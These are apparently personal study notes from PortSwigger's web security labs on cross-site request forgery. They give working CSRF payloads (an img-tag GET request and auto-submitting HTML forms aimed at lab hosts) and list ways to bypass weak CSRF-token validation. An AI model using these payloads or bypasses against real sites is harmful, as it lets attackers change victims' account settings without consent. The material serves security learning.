# PortSwigger Academy Notes

## CSRF
## The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. 
- If the request to change email address can be performed with the GET method, then a self-contained attack would look like this:
- ` <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> `
To craft an HTML PoC for CSRF, there are online generators to use that will take a post request and convert it to an HTML payload.
Here is an example
```
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>'
```
## Common defences against CSRF
* CSRF Tokens: When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action. A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:
```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```
```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```
#Typical CSRF Payload
```
<html>
	<body>
		<form method="POST" action="https://0a8e000104e947029abef873003800d6.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="zeus&#x40;hope.net"/>
			<input type="hidden" name="csrf" value="rv3CmHWB7WhZvUkK4ABMenNmAi3v8mJg"/>
			<input type="submit" value="Submit">
		</form>
 <script>
    document.forms[0].submit();
 </script>
	</body>
<html>
```
 
### CSRF Token Flaws
Validation of CSRF token depends on request method
1. Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
     * Change request to potentially bypass check
2. Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
     * Remove the csrf parameter in the request to potentially bypass check
3. Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
     * Use your own token from your own attack to access a victims account
4.  some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together.
     * If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.
     * The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

* SameSite Cookies
* Referer-Based Validation

